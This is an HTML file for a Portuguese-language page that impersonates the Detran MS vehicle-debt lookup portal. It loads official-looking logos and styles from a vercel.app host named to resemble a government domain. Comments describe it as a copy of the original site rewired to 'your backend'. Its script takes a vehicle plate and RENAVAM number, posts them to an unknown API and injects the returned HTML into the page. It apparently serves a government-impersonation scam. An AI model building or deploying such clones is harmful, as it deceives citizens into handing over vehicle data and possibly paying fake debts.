<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Portal Meu Detran MS</title>
    <!-- Usando o CSS original do site -->
    <link rel="stylesheet" href="https://detranmatogrossosul-govbr.vercel.app/_next/static/chunks/996de2e32a16761a.css">
    <style>
        /* Estilos para nossa integra√ß√£o */
        .form-original { 
            max-width: 360px; 
            margin: 0 auto;
        }
        .hidden { display: none; }
        #loading {
            text-align: center; 
            padding: 20px; 
            color: #0066cc;
        }
        .error { 
            color: red; 
            text-align: center; 
            padding: 10px; 
        }
        
        /* NOVOS ESTILOS PARA RESULTADOS */
        #resultadosContainer {
            width: 100%;
            max-width: 1050px;
            margin: 0 auto;
        }
        
        .btn-voltar {
            width: 200px;
            height: 40px;
            margin: 20px auto;
            display: flex;
            align-items: center;
            justify-content: center;
            text-transform: uppercase;
            color: #284e8a;
            border: 2px solid #284e8a;
            background: transparent;
            font-weight: bold;
            border-radius: 32px;
            cursor: pointer;
        }
        
        .btn-voltar:hover {
            background: #f0f0f0;
        }
    </style>
</head>
<body class="font-sans">
    <!-- CABE√áALHO ORIGINAL -->
    <header class="w-full flex flex-col">
        <div class="w-full bg-white h-10 px-6 max-[600px]:bg-003f7e max-[600px]:flex max-[600px]:justify-center max-[600px]:items-center">
            <div class="w-full max-w-[1050px] max-[600px]:hidden mx-auto h-full flex items-center justify-between">
                <div class="gap-8 flex items-center">
                    <h2 class="font-bold text-base text-1351b4">FALE CONOSCO</h2>
                    <h2 class="font-bold text-base text-1351b4">SITE DETRAN MS</h2>
                </div>
                <div class="gap-8 flex items-center">
                    <h2 class="font-bold text-base text-1351b4">OUVIDORIA</h2>
                    <h2 class="font-bold text-base text-1351b4">TRANSPAR√äNCIA</h2>
                </div>
            </div>
        </div>
        <div class="w-full px-6 bg-004f9f h-[128px]">
            <div class="w-full max-w-[1050px] mx-auto h-full flex justify-between">
                <!-- Logo 1 - Governo MS -->
                <a href="/">
                    <img alt="Governo MS" loading="lazy" width="90" height="118" 
                         src="https://detranmatogrossosul-govbr.vercel.app/assets/svgs/logo.svg">
                </a>
                <!-- Logo 2 - Meu Detran -->
                <img alt="Meu Detran MS" loading="lazy" width="340" height="80"
                     class="max-[600px]:w-[205px]! max-[600px]:h-[48px]! max-[600px]:self-center"
                     src="https://detranmatogrossosul-govbr.vercel.app/assets/svgs/my-dt.svg">
                <!-- Redes sociais -->
                <div class="flex items-center gap-3 max-[800px]:hidden">
                    <svg stroke="#fff" fill="#fff" stroke-width="0" viewBox="0 0 24 24" class="inline size-5 md:size-6 lg:size-8 hover:text-gray-200 transition" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
                        <path d="M14 13.5h2.5l1-4H14v-2c0-1.03 0-2 2-2h1.5V2.14c-.326-.043-1.557-.14-2.857-.14C11.928 2 10 3.657 10 6.7v2.8H7v4h3V22h4v-8.5z" stroke="none"></path>
                    </svg>
                    <!-- Outros √≠cones de redes sociais aqui -->
                </div>
            </div>
        </div>
    </header>

    <!-- MENU DE NAVEGA√á√ÉO -->
    <div class="w-full h-[80px] p-2 bg-white border-b border-b-c8ceda border-solid">
        <div class="w-full h-full max-w-[1050px] mx-auto flex items-center justify-between">
            <div class="flex items-center gap-1">
                <svg stroke="#2c5799" fill="#2c5799" stroke-width="0" viewBox="0 0 20 20" aria-hidden="true" class="size-6 2xl:size-7 text-secondary-600" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
                    <path d="M10.707 2.293a1 1 0 00-1.414 0l-7 7a1 1 0 001.414 1.414L4 10.414V17a1 1 0 001 1h2a1 1 0 001-1v-2a1 1 0 011-1h2a1 1 0 011 1v2a1 1 0 001 1h2a1 1 0 001-1v-6.586l.293.293a1 1 0 001.414-1.414l-7-7z" stroke="none"></path>
                </svg>
                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-chevron-right text-neutral-500 size-6 2xl:size-7">
                    <path d="M9 18l6-6-6-6"></path>
                </svg>
                <h2 class="uppercase font-bold text-base text-1351b4" id="menuTitulo">Consulta de D√©bitos</h2>
            </div>
            <div class="flex items-center gap-1">
                <!-- √çcones de busca e notifica√ß√£o -->
            </div>
        </div>
    </div>

    <!-- CONTE√öDO PRINCIPAL - FORMUL√ÅRIO DE CONSULTA -->
    <main class="p-6 w-full max-w-[900px] mx-auto bg-white" id="formularioContainer">
        <div class="bg-eaebec flex items-start rounded-[8px] w-full">
            <div class="p-7 flex flex-col">
                <div class="flex items-center gap-4 max-[600px]:flex-col max-[600px]:gap-2">
                    <svg stroke="#28a44c" fill="#28a44c" stroke-width="0" viewBox="0 0 16 16" class="text-success-500 size-12 md:size-14 lg:size-14 self-center flex-shrink-0 xl:size-14 undefined" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
                        <path d="M14.5 3a.5.5 0 01.5.5v9a.5.5 0 01-.5.5h-13a.5.5 0 01-.5-.5v-9a.5.5 0 01.5-.5zm-13-1A1.5 1.5 0 000 3.5v9A1.5 1.5 0 001.5 14h13a1.5 1.5 0 001.5-1.5v-9A1.5 1.5 0 0014.5 2z" stroke="none"></path>
                        <path d="M7 5.5a.5.5 0 01.5-.5h5a.5.5 0 010 1h-5a.5.5 0 01-.5-.5m-1.496-.854a.5.5 0 010 .708l-1.5 1.5a.5.5 0 01-.708 0l-.5-.5a.5.5 0 11.708-.708l.146.147 1.146-1.147a.5.5 0 01.708 0M7 9.5a.5.5 0 01.5-.5h5a.5.5 0 010 1h-5a.5.5 0 01-.5-.5m-1.496-.854a.5.5 0 010 .708l-1.5 1.5a.5.5 0 01-.708 0l-.5-.5a.5.5 0 01.708-.708l.146.147 1.146-1.147a.5.5 0 01.708 0" stroke="none"></path>
                    </svg>
                    <h2 class="font-bold text-[30px] uppercase text-284e8a max-[600px]:text-center">
                        Consulta de D√©bitos, Multas e Licenciamento
                    </h2>
                </div>
                
                <p class="text-lg text-1a1a1a mb-3">
                    Insira os dados nos campos abaixo para consultar os d√©bitos do ve√≠culo.
                </p>

                <!-- FORMUL√ÅRIO MODIFICADO - AGORA USA SEU BACKEND -->
                <form id="consultaForm" class="form-original">
                    <div class="w-full flex flex-col gap-1 mb-4">
                        <label class="uppercase text-base text-black font-semibold">
                            Placa do ve√≠culo *
                        </label>
                        <input type="text" id="placa" name="placa" 
                               class="w-full border-b border-b-[#1a1a1a] border-solid pb-1" 
                               placeholder="ABC1D23" 
                               required>
                    </div>
                    
                    <div class="w-full flex flex-col gap-1 mb-6">
                        <label class="uppercase text-base text-black font-semibold">
                            Renavam *
                        </label>
                        <input type="text" id="renavam" name="renavam" 
                               class="w-full border-b border-b-[#1a1a1a] border-solid pb-1" 
                               placeholder="1234567890" 
                               required>
                    </div>

                    <!-- Mensagens de status -->
                    <div id="loading" class="hidden">
                        <p>üîç Consultando d√©bitos...</p>
                    </div>
                    <div id="error" class="error hidden"></div>

                    <div class="flex items-center gap-4 max-[500px]:w-full max-[500px]:flex-col">
                        <button type="submit" 
                                class="w-[155px] max-[500px]:w-full h-10 flex items-center justify-center uppercase text-white text-base font-bold bg-00823c rounded-[32px]">
                            Consultar
                        </button>
                        <button type="button" id="btnCancelar" 
                                class="w-[155px] max-[500px]:w-full h-10 flex items-center justify-center uppercase text-284e8a border border-284e8a border-solid text-base font-bold bg-transparent rounded-[32px]">
                            Cancelar
                        </button>
                    </div>
                </form>
            </div>
            
            <!-- Imagem da mulher apontando (original) -->
            <img alt="Ilustra√ß√£o" loading="lazy" width="300" height="515" 
                 class="flex-none max-[850px]:hidden"
                 src="https://detranmatogrossosul-govbr.vercel.app/_next/image?url=%2Fassets%2Fimgs%2Fwoman_pointing.png&w=384&q=75"
                 srcset="https://detranmatogrossosul-govbr.vercel.app/_next/image?url=%2Fassets%2Fimgs%2Fwoman_pointing.png&w=384&q=75 1x, https://detranmatogrossosul-govbr.vercel.app/_next/image?url=%2Fassets%2Fimgs%2Fwoman_pointing.png&w=640&q=75 2x">
        </div>
    </main>

    <!-- √ÅREA PARA MOSTRAR OS RESULTADOS -->
    <div id="resultadosContainer" class="hidden"></div>

    <!-- RODAP√â ORIGINAL -->
    <footer class="w-full flex items-center justify-between mx-auto max-w-[1050px] border-t border-t-[#1a1a1a] border-solid my-4 pt-4 px-2">
        <div class="flex items-center gap-4">
            <img alt="Governo MS" loading="lazy" width="80" height="40" 
                 src="https://detranmatogrossosul-govbr.vercel.app/assets/svgs/gov.svg">
            <p class="text-xs text-545d69">
                ¬© 2026 Departamento Estadual de Tr√¢nsito - Todos os direitos reservados
            </p>
        </div>
        <div class="flex items-center gap-2">
            <svg stroke="#545d69" fill="#545d69" stroke-width="0" viewBox="0 0 512 512" class="hidden md:block rotate-90 size-6" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
                <path d="M493.4 24.6l-104-24c-11.3-2.6-22.9 3.3-27.5 13.9l-48 112c-4.2 9.8-1.4 21.3 6.9 28l60.6 49.6c-36 76.7-98.9 140.5-177.2 177.2l-49.6-60.6c-6.8-8.3-18.2-11.1-28-6.9l-112 48C3.9 366.5-2 378.1.6 389.4l24 104C27.1 504.2 36.7 512 48 512c256.1 0 464-207.5 464-464 0-11.2-7.7-20.9-18.6-23.4z" stroke="none"></path>
            </svg>
            <p class="text-sm text-545d69">
                Fale com a Gl√≥ria <span class="font-bold">(67) 3368-0500</span>
            </p>
        </div>
    </footer>

    <!-- JAVASCRIPT PARA INTEGRA√á√ÉO COM SEU BACKEND -->
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const form = document.getElementById('consultaForm');
            const loading = document.getElementById('loading');
            const errorDiv = document.getElementById('error');
            const btnCancelar = document.getElementById('btnCancelar');
            const formularioContainer = document.getElementById('formularioContainer');
            const resultadosContainer = document.getElementById('resultadosContainer');
            const menuTitulo = document.getElementById('menuTitulo');

            // Envio do formul√°rio
            form.addEventListener('submit', async function(e) {
                e.preventDefault();
                
                const placa = document.getElementById('placa').value.toUpperCase();
                const renavam = document.getElementById('renavam').value;
                
                // Valida√ß√£o simples
                if (!placa || !renavam) {
                    showError('Preencha placa e RENAVAM!');
                    return;
                }

                // Mostrar loading
                loading.classList.remove('hidden');
                errorDiv.classList.add('hidden');

                try {
                    // Enviar para SEU backend - URL CORRIGIDA PARA VERCEL
                    const response = await fetch('/api/consultar', {  // ‚Üê LINHA CORRIGIDA AQUI!
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            placa: placa,
                            renavam: renavam
                        })
                    });

                    if (!response.ok) {
                        throw new Error('Erro na consulta');
                    }

                    // Receber o HTML com os resultados
                    const htmlResultado = await response.text();
                    
                    // Exibir os resultados na mesma p√°gina
                    exibirResultados(htmlResultado);

                } catch (error) {
                    showError('Erro ao consultar: ' + error.message);
                } finally {
                    loading.classList.add('hidden');
                }
            });

            // Bot√£o cancelar
            btnCancelar.addEventListener('click', function() {
                form.reset();
                errorDiv.classList.add('hidden');
            });

            function showError(mensagem) {
                errorDiv.textContent = mensagem;
                errorDiv.classList.remove('hidden');
            }

            function exibirResultados(html) {
                // 1. Esconder formul√°rio
                formularioContainer.classList.add('hidden');
                
                // 2. Atualizar t√≠tulo do menu
                menuTitulo.textContent = 'Resultados da Consulta';
                
                // 3. Limpar container anterior
                resultadosContainer.innerHTML = '';
                
                // 4. Adicionar conte√∫do dos resultados
                resultadosContainer.innerHTML = html;
                
                // 5. Adicionar bot√£o "Nova Consulta"
                const botaoVoltar = document.createElement('div');
                botaoVoltar.className = 'text-center mt-8 mb-6';
                botaoVoltar.innerHTML = `
                    <button onclick="voltarParaConsulta()" 
                            class="btn-voltar">
                        ‚Üê Nova Consulta
                    </button>
                `;
                
                // Inserir bot√£o no final dos resultados
                resultadosContainer.appendChild(botaoVoltar);
                
                // 6. Mostrar container de resultados
                resultadosContainer.classList.remove('hidden');
            }

            // Fun√ß√£o global para voltar
            window.voltarParaConsulta = function() {
                // 1. Esconder resultados
                resultadosContainer.classList.add('hidden');
                resultadosContainer.innerHTML = '';
                
                // 2. Mostrar formul√°rio
                formularioContainer.classList.remove('hidden');
                
                // 3. Resetar formul√°rio
                form.reset();
                
                // 4. Atualizar t√≠tulo do menu
                menuTitulo.textContent = 'Consulta de D√©bitos';
                
                // 5. Limpar erros
                errorDiv.classList.add('hidden');
            }
        });
    </script>
</body>
</html>